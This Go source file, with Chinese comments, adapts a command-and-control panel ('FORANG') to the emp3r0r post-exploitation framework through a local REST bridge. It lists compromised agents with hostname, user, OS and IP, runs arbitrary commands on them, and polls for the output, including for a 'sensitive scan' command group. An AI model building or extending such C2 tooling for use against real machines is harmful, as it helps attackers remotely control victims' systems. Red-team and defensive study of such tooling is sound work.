package server

// emp3r0r.go — FORANG ↔ emp3r0r 融合适配层。
//
// emp3r0r 是第二个 C2 后端：宿主机侧 emp3r0r-bridge（持 WireGuard 凭据，spawn
// `emp3r0r mcp` 子进程）暴露 localhost REST，本适配层经 bridge 操作目标与执行
// 命令。会话/任务以 "emp3r0r:" 前缀做命名空间，与 goc2 的 sess_/task_ 天然区分，
// c2_api.go 的融合路由按前缀分流——面板无感知地同时显示两个后端。
//
// 配置（环境变量，未设则 emp3r0r 后端不启用，行为与旧版完全一致）：
//
//	EMP3R0R_BRIDGE       bridge 地址（默认 http://127.0.0.1:18660）
//	EMP3R0R_BRIDGE_TOKEN bridge 认证 token
//	EMP3R0R_EXEC_TIMEOUT exec 同步等待秒数（默认 15，须小于面板 HTTP 超时 20s）

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	emp3r0rIDPrefix = "emp3r0r:"
	emp3r0rTaskPfx  = "emp3r0r_task_"
)

var (
	emp3r0rBridge    string
	emp3r0rToken     string
	emp3r0rExecWait  = 15
	emp3r0rHTTP      = &http.Client{Timeout: 20 * time.Second}
	emp3r0rTasks     sync.Map // 伪 taskId → *emp3r0rTask
	emp3r0rTaskSeq   int64
	emp3r0rTaskSeqMu sync.Mutex
)

type emp3r0rTask struct {
	ID        string         `json:"taskId"`
	ClientID  string         `json:"client_id"`
	Type      string         `json:"type"`
	Args      map[string]any `json:"args"`
	Status    string         `json:"status"` // queued | running | done | failed
	Output    string         `json:"output"`
	Err       string         `json:"-"`
	CreatedAt time.Time      `json:"created_at"`
	UpdatedAt time.Time      `json:"updated_at"`
	mu        sync.Mutex
}

func (t *emp3r0rTask) mu2() *sync.Mutex { return &t.mu }

// MarshalJSON 与 goc2 任务的 Task.MarshalJSON 同构（双形状，FORANG 消费者通用）。
func (t *emp3r0rTask) MarshalJSON() ([]byte, error) {
	return json.Marshal(map[string]any{
		"taskId": t.ID, "id": t.ID, "client_id": t.ClientID,
		"type": t.Type, "args": t.Args, "status": t.Status,
		"result": t.Output, "output": t.Output, "error": t.Err,
		"created_at": t.CreatedAt, "createdAt": t.CreatedAt, "updated_at": t.UpdatedAt,
	})
}

func emp3r0rInit() {
	emp3r0rBridge = strings.TrimRight(strings.TrimSpace(os.Getenv("EMP3R0R_BRIDGE")), "/")
	emp3r0rToken = strings.TrimSpace(os.Getenv("EMP3R0R_BRIDGE_TOKEN"))
	if v := strings.TrimSpace(os.Getenv("EMP3R0R_EXEC_TIMEOUT")); v != "" {
		var n int
		if _, err := fmt.Sscanf(v, "%d", &n); err == nil && n > 0 && n < 18 {
			emp3r0rExecWait = n
		}
	}
	if emp3r0rBridge != "" && emp3r0rToken == "" {
		emp3r0rBridge = "" // token 缺失时禁用后端（fail-closed）
	}
}

func emp3r0rEnabled() bool { return emp3r0rBridge != "" }

// emp3r0rCall 调 bridge REST。
func emp3r0rCall(method, path string, body any) ([]byte, int, error) {
	var rd io.Reader
	if body != nil {
		b, _ := json.Marshal(body)
		rd = strings.NewReader(string(b))
	}
	req, err := http.NewRequest(method, emp3r0rBridge+path, rd)
	if err != nil {
		return nil, 0, err
	}
	req.Header.Set("X-Bridge-Token", emp3r0rToken)
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := emp3r0rHTTP.Do(req)
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()
	raw, err := io.ReadAll(io.LimitReader(resp.Body, 32<<20))
	return raw, resp.StatusCode, err
}

// emp3r0rStatus 后端健康（面板 status 聚合用）。
func emp3r0rStatus() map[string]any {
	if !emp3r0rEnabled() {
		return nil
	}
	out := map[string]any{"url": emp3r0rBridge, "reachable": false}
	raw, code, err := emp3r0rCall("GET", "/status", nil)
	if err == nil && code == 200 {
		out["reachable"] = true
		var env struct {
			Data map[string]any `json:"data"`
		}
		if json.Unmarshal(raw, &env) == nil {
			out["mcp_alive"] = env.Data["mcp_alive"]
			out["active_target"] = env.Data["active_target"]
		}
	} else if err != nil {
		out["error"] = err.Error()
	}
	return out
}

// emp3r0rListClients 拉目标并映射成 goc2 Client 形状（id 加前缀命名空间）。
func emp3r0rListClients() []any {
	if !emp3r0rEnabled() {
		return nil
	}
	raw, code, err := emp3r0rCall("GET", "/agents", nil)
	if err != nil || code != 200 {
		return nil
	}
	var env struct {
		Data string `json:"data"` // bridge 返回 MCP text（list_agents 的 JSON 文本）
	}
	if json.Unmarshal(raw, &env) != nil {
		return nil
	}
	// list_agents 输出可能是 JSON 数组、{"agents":[...]} 包裹对象或带说明的文本
	var agents []map[string]any
	trimmed := strings.TrimSpace(env.Data)
	switch {
	case strings.HasPrefix(trimmed, "["):
		_ = json.Unmarshal([]byte(trimmed), &agents)
	case strings.HasPrefix(trimmed, "{"):
		var wrapped struct {
			Agents []map[string]any `json:"agents"`
		}
		if json.Unmarshal([]byte(trimmed), &wrapped) == nil && wrapped.Agents != nil {
			agents = wrapped.Agents
		} else {
			var one map[string]any
			if json.Unmarshal([]byte(trimmed), &one) == nil {
				agents = []map[string]any{one}
			}
		}
	}
	out := []any{}
	for _, a := range agents {
		tag, _ := a["tag"].(string)
		if tag == "" {
			if v, ok := a["name"].(string); ok {
				tag = v
			}
		}
		if tag == "" {
			continue
		}
		out = append(out, emp3r0rClientShape(tag, a))
	}
	return out
}

// emp3r0rClientShape 把 emp3r0r agent 字段映射成 goc2 Client 形状（尽力抽取，
// 原始字段进 extra 供前端诊断）。
func emp3r0rClientShape(tag string, a map[string]any) map[string]any {
	get := func(keys ...string) string {
		for _, k := range keys {
			if v, ok := a[k].(string); ok && v != "" {
				return v
			}
		}
		return ""
	}
	return map[string]any{
		"id":        emp3r0rIDPrefix + tag,
		"hostname":  get("host", "hostname", "hostname_clean"),
		"username":  get("user", "username"),
		"os":        get("os", "os_type", "platform"),
		"arch":      get("arch", "goarch"),
		"ip":        get("ip", "local_ip", "internal_ip"),
		"listener":  "emp3r0r",
		"last_seen": time.Now().Format(time.RFC3339),
		"notes":     "emp3r0r agent",
		"extra":     a,
	}
}

// emp3r0rEnqueueExec 创建伪任务并同步执行（等待上限 emp3r0rExecWait 秒，
// 超时任务保持 running，输出由 c2TasksAPI 触发 /job 查询补齐）。
func emp3r0rEnqueueExec(agentTag, cmd string) (string, *emp3r0rTask) {
	emp3r0rTaskSeqMu.Lock()
	emp3r0rTaskSeq++
	seq := emp3r0rTaskSeq
	emp3r0rTaskSeqMu.Unlock()
	id := fmt.Sprintf("%s%d", emp3r0rTaskPfx, seq)
	t := &emp3r0rTask{
		ID: id, ClientID: emp3r0rIDPrefix + agentTag,
		Type: "exec", Args: map[string]any{"cmd": cmd},
		Status: "running", CreatedAt: time.Now(), UpdatedAt: time.Now(),
	}
	emp3r0rTasks.Store(id, t)
	go func() {
		raw, code, err := emp3r0rCall("POST", "/exec", map[string]any{"agent": agentTag, "cmd": cmd})
		t.mu2().Lock()
		t.UpdatedAt = time.Now()
		if err != nil {
			t.Status, t.Output, t.Err = "failed", "bridge 不可达: "+err.Error(), "bridge error"
			t.mu2().Unlock()
			return
		}
		var env struct {
			Data string `json:"data"`
		}
		_ = json.Unmarshal(raw, &env)
		if code >= 400 {
			var e struct {
				Detail string `json:"detail"`
			}
			_ = json.Unmarshal(raw, &e)
			t.Status, t.Output, t.Err = "failed", e.Detail, e.Detail
			t.mu2().Unlock()
			return
		}
		t.Status = "done"
		t.Output = env.Data
		t.mu2().Unlock()

		// 补齐命令回显：调度回执里有 job_id，轮询 /job 拉实际输出写回任务，
		// 前端（c2classic 控制台/SSE）读任务即可见命令结果。
		var sched struct {
			JobID    string `json:"job_id"`
			Executed bool   `json:"executed"`
		}
		if json.Unmarshal([]byte(env.Data), &sched) == nil && sched.JobID != "" {
			for i := 0; i < 15; i++ {
				time.Sleep(2 * time.Second)
				jraw, jcode, jerr := emp3r0rCall("GET", "/job?id="+sched.JobID, nil)
				if jerr != nil || jcode != 200 {
					continue
				}
				var jenv struct {
					Data string `json:"data"`
				}
				if json.Unmarshal(jraw, &jenv) != nil {
					continue
				}
				var job struct {
					Output string `json:"output"`
					Size   int    `json:"size"`
				}
				if json.Unmarshal([]byte(jenv.Data), &job) != nil {
					continue
				}
				if job.Size > 0 {
					t.mu2().Lock()
					t.Output = job.Output
					t.UpdatedAt = time.Now()
					t.mu2().Unlock()
					return
				}
			}
		}
	}()
	return id, t
}

// emp3r0rTaskView 任务视图（c2TasksAPI 融合路由用）。
func emp3r0rTaskView(taskID string) map[string]any {
	v, ok := emp3r0rTasks.Load(taskID)
	if !ok {
		return nil
	}
	return map[string]any{"data": []any{v.(*emp3r0rTask)}}
}

// emp3r0rAllTasks 快照全部任务（c2classic SSE poller 用），字段形状对齐
// goc2 ListTasks 的 map：id/status/output/error/createdAt/args/type。
func emp3r0rAllTasks() []any {
	out := []any{}
	emp3r0rTasks.Range(func(_, v any) bool {
		t, ok := v.(*emp3r0rTask)
		if !ok {
			return true
		}
		t.mu.Lock()
		row := map[string]any{
			"id":         t.ID,
			"client_id":  t.ClientID,
			"type":       t.Type,
			"args":       t.Args,
			"status":     t.Status,
			"output":     t.Output,
			"error":      t.Err,
			"createdAt":  t.CreatedAt.Format(time.RFC3339Nano),
		}
		t.mu.Unlock()
		out = append(out, row)
		return true
	})
	return out
}

// emp3r0rRunWait 同步执行一条命令并等待实际回显（c2classic 的
// sysinfo/敏感扫描命令组用，语义对齐 c2RunTaskWait）。
//
// 轮询目标任务的 Output：回显由任务补齐 goroutine 从 bridge /job 拉回，
// 调度回执（含 job_id 的 JSON）不算最终输出。返回输出或超时错误。
func emp3r0rRunWait(ctx context.Context, tag, cmd string, timeout time.Duration) (string, error) {
	id, _ := emp3r0rEnqueueExec(tag, cmd)
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		select {
		case <-ctx.Done():
			return "", ctx.Err()
		default:
		}
		if v, ok := emp3r0rTasks.Load(id); ok {
			t := v.(*emp3r0rTask)
			t.mu.Lock()
			status, output, errStr := t.Status, t.Output, t.Err
			t.mu.Unlock()
			if status == "failed" {
				return "", fmt.Errorf("%s", errStr)
			}
			// done 且 Output 已补齐为真实回显（调度回执含 job_id 字段）
			if status == "done" && output != "" && !strings.Contains(output, `"job_id"`) {
				return output, nil
			}
		}
		time.Sleep(1500 * time.Millisecond)
	}
	return "", fmt.Errorf("等待命令输出超时（%s）", timeout)
}
